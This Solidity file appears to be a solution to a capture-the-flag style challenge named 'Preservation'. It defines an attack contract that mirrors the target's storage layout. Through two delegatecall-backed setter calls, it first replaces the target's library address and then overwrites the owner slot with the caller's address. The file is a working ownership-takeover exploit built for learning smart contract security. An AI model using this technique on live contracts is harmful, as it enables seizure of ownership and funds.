// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function setFirstTime(uint256) external;
    function setSecondTime(uint256) external;
    function owner() external view returns (address);
}

contract AttackPreservation {
    // Aligning storage layout so it is the same as Preservation
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }

    function attack(IPreservation _target) external {
        // Set the library to this contract
        _target.setFirstTime(uint256(uint160(address(this))));
        // Set the owner to us by executing our setTime() function
        _target.setFirstTime(uint256(uint160(msg.sender)));
        require(_target.owner() == msg.sender, "Did not set owner properly");
    }
}
